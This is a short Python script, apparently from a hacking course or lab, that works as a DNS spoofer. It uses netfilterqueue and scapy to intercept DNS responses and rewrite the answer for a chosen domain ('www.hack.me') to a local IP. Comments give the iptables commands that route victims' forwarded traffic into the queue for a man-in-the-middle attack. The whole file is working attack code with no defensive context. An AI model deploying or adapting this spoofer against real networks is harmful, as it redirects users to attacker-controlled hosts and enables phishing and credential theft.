#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# First:
# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> for mitm
# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> own computer
# iptables -I INPUT -j NFQUEUE --queue-num 0    --> own computer
# iptables flush  --> back to normal


def process_packet(packet):
    # Converting packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):      # DNS Resource Record
        qname = scapy_packet[scapy.DNSQR].qname     # URL
        website_to_change = "www.hack.me"
        if website_to_change.encode() in qname:
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            # Deleting these so scapy recalculate them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            # Converting scapy packet to a packet
            packet.set_payload(bytes(scapy_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()